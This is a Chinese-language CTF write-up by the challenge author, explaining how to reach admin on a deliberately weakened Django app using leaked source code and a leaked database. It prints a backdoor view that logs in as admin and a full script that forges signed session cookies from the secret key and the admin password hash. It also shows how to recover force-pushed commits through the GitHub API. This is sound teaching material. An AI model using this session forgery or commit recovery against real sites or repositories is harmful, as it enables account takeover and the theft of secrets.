# 被泄漏的姜戈

本题的灵感来源于……大家应该都知道了，我就不写了。

首先，题面非常清楚提示了：

> 好像还在什么 hub 还是 lab 来着建了一个叫 openlug……

所以第一步是找到这玩意泄漏出的源代码（和数据库），否则是不可能做出来的。为什么会有人拿个 `sqlmap` 一通扫啊……醉了。

最终，你可以在 https://github.com/openlug/django-common 或者 https://gitlab.com/openlug/django-common 找到源代码。用 `openlug` 和 `Rabbit House` 都是能搜到结果的。

## 简单的解法

需要简单学习 Django，并添加一个可以让你登录为 admin 的路由。

在 `app/views.py` 添加：

```python
from django.contrib.auth.models import User
def backdoor(request):
    user = User.objects.get(username="admin")  # 使用 Django ORM 选择 admin 用户
    login(request, user) # 以 admin 的身份登录
    return redirect(reverse("profile")) # 跳转到 profile
```

然后在 `app/urls.py` 里的 `urlpatterns` 里面添加 URL：

```python
path('backdoor', views.backdoor, name='backdoor')
```

然后开跑：

```
python manage.py runserver
```

访问我们加入的 backdoor，就可以看到 admin 的 cookie 了。把这个 cookie 复制，在 Console 里面 `document.cookie=...` 给 cookie 赋值，进入 `/profile` 就行了。

## 复杂的解法

这是我最开始出完题之后使用的解法。这种解法需要去看 Django 的源代码，了解其是如何处理 session 的。

首先根据 https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions ，加上 `settings.py` 里面的设置，可以看到 session 设置成了签名后存储在 cookie 中。文档同时也给了一个 RCE 警告，但是因为我们没有用 `PickleSerializer`，所以没有这个漏洞。

### 从签名还原 session

登录为 guest，可以看到 guest 的 cookie 为

```
sessionid=.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iLiU1:d4koNGDuy18fbggeMbGhprUL_gs
```

然后呢？如果直接用 https://docs.djangoproject.com/en/2.2/topics/signing/ 里的方式，用 `signing.loads(value)` 的话，只能得到一条 Exception。我们要看 `django.contrib.sessions.backends.signed_cookies` 的实现。在此类的 `load` 方法中，可以看到：

```python
return signing.loads(
                self.session_key,
                serializer=self.serializer,
                # This doesn't handle non-default expiry dates, see #19201
                max_age=settings.SESSION_COOKIE_AGE,
                salt='django.contrib.sessions.backends.signed_cookies',
            )
```

它加盐了。我们用这个盐重新加载：

```python
value = ".eJx（之后的内容省略）"
signing.loads(value, salt='django.contrib.sessions.backends.signed_cookies')
```

可以看到 guest session 是：

```python
{'_auth_user_id': '2', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend', '_auth_user_hash': '0a884f8b987fca1a92c6f93d9042d83eea72d98d'}
```

### 修改 session

我们的目标是让 `_auth_user_id` 为 1，并且改变后面对应的 `_auth_user_hash`，使 Django 认为我们的 cookie 是正确的。但后面那个 `_auth_user_hash` 又是个什么东西？

搜索 `_auth_user_hash`，可以找到 https://docs.djangoproject.com/zh-hans/2.2/_modules/django/contrib/auth/ ，其中对应到了 `HASH_SESSION_KEY` 变量，最终可以找到 `user.get_session_auth_hash()`。

这个函数的实现在 `django/contrib/auth/base_user.py`。

```python
def get_session_auth_hash(self):
    """
    Return an HMAC of the password field.
    """
    key_salt = "django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"
    return salted_hmac(key_salt, self.password).hexdigest()
```

这里的 `self.password` 不是原始密码，而是数据库中存储的密码哈希。读一下附送的 SQLite 数据库的 `auth_user` 表就可以了。

最终 exp 如下：

```python
from django.core import signing
from django.utils.crypto import salted_hmac

admin_hash = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="

_auth_user_hash = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash",
                              admin_hash).hexdigest()

payload = {'_auth_user_id': '1',
           '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
           '_auth_user_hash': _auth_user_hash}

cookie = signing.dumps(payload,
                       salt='django.contrib.sessions.backends.signed_cookies',
                       compress=True)

print(cookie)
```

## 花絮

### 关于 Django

一开始想出这个题，是因为自己在网上找到了铺天盖地的如何构造 Flask 的 session 和使用 Django signed cookies 的 `PickleSerializer` 的 wp，但是怎么找都找不到怎么构造 Django 的 session，才开写的。

本来这道题可以变成一道比较难的 web，但被 Z 同学发现了简单解之后，一下子就变简单了，而且我也没什么时间去改，于是就变成这样了。

其实 Django 还是挺靠谱的，单单泄漏 secret key 而不泄漏密码哈希也是搞不了这样的效果的，而且为了整出这样的「漏洞」，并方便大家测试，特地把 Django 的默认设置进行了一些魔改，包括使用 cookies（而不是在数据库里存 session）等等。

此外为了能够只读挂 SQLite 数据库，对 Django 进行了一下 monkey patch：

```python
from django.contrib.auth import models


def update_last_login(sender, user, **kwargs):
    pass


models.update_last_login = update_last_login
```

这样登录 guest 用户的时候，数据库里最后登录时间就不会更新。

最后在 `settings.py` 里面，还留了一个小彩蛋：

> SECURITY WARNING: keep the secret key used in production **non-secret**!

### 关于命名

嗯？至于你问为什么要起名叫「Rabbit House 成员管理系统」？这是因为在写题目的时候，社团活动室的一位同学正在尝试在 Minecraft 里面搭建点兔式的小镇与咖啡馆，于是我就这么起名字了，反正没有人会这么给自己的项目命名，也更好搜索。

至于那个咖啡馆，最后确实建成了，只是附近多出了好几个核弹坑而已。~~咖啡厅孤岛~~ ~~点兔终末旅行~~

### 你知道吗？Force push 来「撤销」机密信息的提交很多时候是没有用的。

一开始在上传到 GitHub 的 openlug 的私仓的时候，一不小心把带 flag 的文件交上去了。一开始我就直接 force push 覆盖了，但是之后舍友 F（也是正则那道题的出题人）提醒我还有问题（见 https://ibugone.com/blog/2019/06/save-commit-from-github/ ）。 ~~差点被非预期~~

本地，可以输入 `git reflog` 来看你所有的修改记录，包括你的 `reset --hard` 操作。以下是一个示例。

```
$ git reflog
fccf006 (HEAD -> master) HEAD@{0}: reset: moving to fccf0069b5de863e35ff00a64308176c40bc343a
d5244a8 HEAD@{1}: commit: add
fccf006 (HEAD -> master) HEAD@{2}: commit (initial): init
```

可以使用 `git reset SHA1` 回到 reset 之前的状态。

尽管 `reflog` 不会被上传到 git 服务器中，但是很多 git 服务也还是保留着记录的（就算你 force push）。比如说 GitHub：

```
curl https://api.github.com/repos/用户名/仓库名/events
```

你会惊讶地发现，你就算 force push，记录还被保存着。那怎么获取这条记录的内容呢？我们拿到 commit 的 SHA1，之后：

```
wget https://api.github.com/repos/用户名/仓库名/tarball/SHA1
```

就能下载下来了。

嗯？你问我一不小心把密码传上了 GitHub 公开仓库怎么办？你还是赶紧改密码吧。

当然一个好消息是：GitHub 不会存你所有的记录。

> Events support [pagination](https://developer.github.com/v3/#pagination), however the `per_page` option is unsupported. The fixed page size is 30 items. Fetching up to ten pages is supported, for a total of 300 events.
>
> Only events created within the past 90 days will be included in timelines. Events older than 90 days will not be included (even if the total number of events in the timeline is less than 300).

(from: https://developer.github.com/v3/activity/events/#list-public-events)